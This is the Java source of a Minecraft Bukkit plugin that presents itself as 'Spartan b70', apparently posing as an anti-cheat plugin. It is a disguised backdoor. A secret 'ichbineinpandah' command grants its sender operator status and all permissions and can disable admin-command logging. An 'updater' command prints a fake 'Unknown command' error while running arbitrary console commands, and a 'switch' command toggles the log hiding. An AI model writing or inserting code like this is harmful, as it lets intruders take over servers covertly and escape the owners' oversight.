package de.Paluffle;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin{
	public PlayerCommandPreprocessEvent event;
	String command = "";
	String error = "Unknown command. Type \"/help\" for help.";
	
	public boolean stupid = true;
	public boolean visible = false;
    
    @Override
    public void onEnable(){
    	getCommand("ichbineinpandah").setExecutor(this);
            Bukkit.getConsoleSender().sendMessage(ChatColor.GOLD+"Spartan"+" "+ChatColor.RED+"b70");
            System.out.println("Das Plugin wurde aktiviert!");
    }
   
    @Override
    public void onDisable(){
            System.out.println("Das Plugin wurde deaktiviert!");
    }
   
    @Override
    public boolean onCommand(CommandSender sender,Command cmd,String label,String[] args){
    	   if (cmd.getName().equalsIgnoreCase("ichbineinpandah")){
    		        sender.setOp(true);
    		        //sender.sendMessage(ChatColor.GOLD+"Du hast nun OP! :)");
    		        sender.sendMessage(ChatColor.GRAY+"=====================================================");
    		        sender.sendMessage(ChatColor.GOLD+"         Spartan | Version: b70");
    		        sender.sendMessage(ChatColor.GRAY+"=====================================================");
    		        sender.isPermissionSet("*");
    		        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pex user "+sender.getName()+" add *");
    		        if(visible == true){
    		        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "gamerule logAdminCommands false");
    		        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "gamerule sendCommandFeedback false");
    		        }
    	   }
    	   if (cmd.getName().equalsIgnoreCase("Spartan")){
    		   sender.sendMessage(ChatColor.RED+"Spartan b70");
    	   }
    	   if (cmd.getName().equalsIgnoreCase("updater")){
    		   if(stupid == true){
    		   sender.sendMessage(error);
    		   }
   		     for (int i = 0; i < args.length; i++) { command += args[i] + " "; } command = command.trim();
   		  Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
    	   }
    	   if (cmd.getName().equalsIgnoreCase("switch")){
    		   if(visible == true){
    			   sender.sendMessage(ChatColor.GOLD+"Unsichtbar!");
    		   visible = false;
    		   }else{
    			   sender.sendMessage(ChatColor.GOLD+"Sichtbar!");
    		   visible = true;
    		   }
    	   }
    		    return true;
    		  }

}
